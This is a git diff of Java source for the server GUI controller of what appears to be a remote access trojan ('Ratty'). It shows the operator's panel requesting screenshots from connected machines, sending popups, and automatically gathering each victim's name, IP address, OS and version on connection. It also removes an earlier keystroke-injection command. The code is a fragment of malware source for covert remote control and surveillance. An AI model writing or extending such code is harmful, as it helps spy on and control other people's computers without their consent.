@@ -1,15 +1,15 @@
 package de.sogomn.rat.server.gui;
 
-import java.awt.event.KeyEvent;
 import java.util.ArrayList;
 
 import de.sogomn.rat.ActiveClient;
 import de.sogomn.rat.IClientObserver;
 import de.sogomn.rat.packet.FreePacket;
 import de.sogomn.rat.packet.IPacket;
-import de.sogomn.rat.packet.KeyEventPacket;
+import de.sogomn.rat.packet.InformationPacket;
 import de.sogomn.rat.packet.PopupPacket;
-import de.sogomn.rat.packet.ScreenshotPacket;
+import de.sogomn.rat.packet.request.InformationRequestPacket;
+import de.sogomn.rat.packet.request.ScreenshotRequestPacket;
 import de.sogomn.rat.server.ActiveServer;
 import de.sogomn.rat.server.IServerObserver;
 
@@ -51,13 +51,11 @@ public final class ServerGuiController implements IServerObserver, IClientObserv
 	/*HARDCODED ATM*/
 	private IPacket getPacket(final String actionCommand) {
 		if (actionCommand == RattyGui.POPUP) {
-			return new PopupPacket("Test message");
-		} else if (actionCommand == RattyGui.SCREENSHOT) {
-			return new ScreenshotPacket(0, 0, 1000, 1000);
-		} else if (actionCommand == RattyGui.KEY_EVENT) {
-			return new KeyEventPacket(KeyEvent.VK_G, KeyEventPacket.TYPE);
+			return PopupPacket.create();
 		} else if (actionCommand == RattyGui.FREE) {
 			return new FreePacket();
+		} else if (actionCommand == RattyGui.SCREENSHOT) {
+			return new ScreenshotRequestPacket();
 		}
 		
 		return null;
@@ -65,6 +63,17 @@ public final class ServerGuiController implements IServerObserver, IClientObserv
 	
 	@Override
 	public void packetReceived(final ActiveClient client, final IPacket packet) {
+		if (packet instanceof InformationPacket) {
+			final InformationPacket information = (InformationPacket)packet;
+			final long id = getClient(client).id;
+			final String name = information.getName();
+			final String address = client.getAddress();
+			final String os = information.getOS();
+			final String version = information.getVersion();
+			
+			gui.addRow(id, name, address, os, version);
+		}
+		
 		packet.execute(client);
 	}
 	
@@ -90,19 +99,19 @@ public final class ServerGuiController implements IServerObserver, IClientObserv
 		final IPacket packet = getPacket(actionCommand);
 		
 		if (packet != null) {
-			client.sendPacket(packet);
+			client.addPacket(packet);
 		}
 	}
 	
 	public void addClient(final ActiveClient client) {
 		final long id = nextId++;
 		final ServerClient serverClient = new ServerClient(id, client);
+		final InformationRequestPacket packet = new InformationRequestPacket();
 		
 		client.setObserver(this);
 		clients.add(serverClient);
 		client.start();
-		
-		gui.addRow(id, "Unknown", client.getAddress(), "NA", "NA");
+		client.addPacket(packet);
 	}
 	
 	public void removeClient(final ActiveClient client) {
